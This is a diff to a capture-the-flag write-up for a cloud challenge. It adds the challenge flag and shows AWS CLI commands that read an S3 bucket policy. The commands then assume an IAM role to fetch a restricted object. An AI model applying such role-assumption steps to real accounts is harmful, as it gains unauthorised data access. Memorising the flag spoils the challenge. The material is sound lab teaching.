@@ -7,7 +7,7 @@ difficulty: medium
 categories: [cloud]
 tags: []
 
-flag:
+flag: he2023{r013_assum3d_succ3ssfuLLy}
 
 ---
 
@@ -101,3 +101,92 @@ We get 3 very cute cat pictures
 ![](writeupfiles/cat3.jpg)
 
 but an error on the fourth image, hmm..
+
+maybe an older version didnt have the restriction?
+
+```
+$ aws s3api list-object-versions --bucket cats-in-a-bucket
+
+An error occurred (AccessDenied) when calling the ListObjectVersions operation: Access Denied
+```
+
+ok, let's look at the policies that are set
+
+```
+$ aws s3api get-bucket-policy --bucket cats-in-a-bucket
+```
+
+```json
+{
+  "Statement": [
+    {
+      "Action": [
+        "s3:ListBucket",
+        "s3:GetBucketPolicy"
+      ],
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::261640479576:user/misterbuttons"
+      },
+      "Resource": "arn:aws:s3:::cats-in-a-bucket"
+    },
+    {
+      "Action": "s3:GetObject",
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::261640479576:user/misterbuttons"
+      },
+      "Resource": [
+        "arn:aws:s3:::cats-in-a-bucket/cat1.jpg",
+        "arn:aws:s3:::cats-in-a-bucket/cat2.jpg",
+        "arn:aws:s3:::cats-in-a-bucket/cat3.jpg"
+      ]
+    },
+    {
+      "Action": "s3:ListBucket",
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::261640479576:role/captainclaw"
+      },
+      "Resource": "arn:aws:s3:::cats-in-a-bucket"
+    },
+    {
+      "Action": "s3:GetObject",
+      "Effect": "Allow",
+      "Principal": {
+        "AWS": "arn:aws:iam::261640479576:role/captainclaw"
+      },
+      "Resource": "arn:aws:s3:::cats-in-a-bucket/cat4.jpg"
+    }
+  ],
+  "Version": "2008-10-17"
+}
+```
+
+ok, so `cat4.jpg` is only accessible for the `captainclaw` role. Let's set that up:
+
+in `~/.aws/config` we set:
+
+```
+[default]
+region = eu-central-1
+
+[profile cat]
+role_arn = arn:aws:iam::261640479576:role/captainclaw
+source_profile = default
+```
+
+and try downloading again:
+
+```
+$ aws s3 cp --profile cat s3://cats-in-a-bucket/cat4.jpg .
+download: s3://cats-in-a-bucket/cat4.jpg to ./cat4.jpg
+```
+
+whoo, success!
+
+![](writeupfiles/cat4.jpg)
+
+
+
+
